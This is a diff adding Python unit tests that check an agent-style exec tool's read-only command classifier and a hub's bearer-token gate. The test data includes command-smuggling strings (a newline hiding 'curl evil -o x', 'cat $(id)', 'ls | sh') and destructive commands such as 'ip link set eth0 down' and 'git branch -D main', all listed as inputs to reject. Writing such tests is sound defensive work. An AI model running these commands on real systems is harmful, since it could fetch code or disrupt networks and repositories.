@@ -78,6 +78,57 @@ class Exec(unittest.TestCase):
         self.assertEqual(audit_rows()[-1]["outcome"], "timeout")
 
 
+class ExecReadOnly(unittest.TestCase):
+    """Security review 2026-11-12: a newline hid a second command, and some 'read-only' commands could write."""
+
+    def test_shell_syntax_is_never_read(self):
+        for c in ["ls\ncurl evil -o x", "ls\rid", "ls *", "ls ~", "ls {a,b}", "cat $(id)", "ls; id", "ls | sh"]:
+            self.assertNotEqual(exec_tool.classify(c), "read", c)
+
+    def test_writing_options_are_not_read(self):
+        for c in ["ip link set eth0 down", "ip route del default", "ip addr flush dev eth0", "git diff --output=/x",
+                  "git remote set-url origin x", "git branch -D main", "git -c core.pager=sh log", "find . -fprint /x",
+                  "find . -fprintf /x %p", "find . -fls /x", "journalctl --vacuum-size=1", "journalctl --rotate", "ss -K"]:
+            self.assertNotEqual(exec_tool.classify(c), "read", c)
+
+    def test_real_reads_still_read(self):
+        for c in ["ls -la /tmp", "ip addr", "ip -br addr", "ip route show", "git status", "git log -5",
+                  "journalctl -u x -n 50", "ss -tlnp", "systemctl --user status x", "find . -name x.py"]:
+            self.assertEqual(exec_tool.classify(c), "read", c)
+
+    def test_read_runs_without_a_shell(self):
+        seen = []
+        exec_tool.run("local", "ls -la /tmp", runner=lambda a, **k: seen.append(a) or
+                      subprocess.CompletedProcess(a, 0, "", ""))
+        self.assertEqual(seen[0], ["ls", "-la", "/tmp"])
+
+
+class HubToken(unittest.TestCase):
+    def test_bearer_gate(self):
+        import asyncio
+        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "hub"))
+        try:
+            import hub
+        except ImportError:
+            self.skipTest("mcp SDK not installed")
+        hits = []
+
+        async def app(scope, receive, send):
+            hits.append(1)
+        gated = hub.bearer_gate(app, "x" * 32)
+        sent = []
+
+        async def send(m):
+            sent.append(m)
+        for hdr, ok in [([], False), ([(b"authorization", b"Bearer nope")], False),
+                        ([(b"authorization", b"Bearer " + b"x" * 32)], True)]:
+            sent.clear(); n = len(hits)
+            asyncio.run(gated({"type": "http", "headers": hdr}, None, send))
+            self.assertEqual(len(hits) > n, ok)
+            if not ok:
+                self.assertEqual(sent[0]["status"], 401)
+
+
 class Senses(unittest.TestCase):
     def setUp(self):
         senses.cameras = lambda: {"desk": {"name": "desk", "kind": "usb", "source": "/dev/video9"},
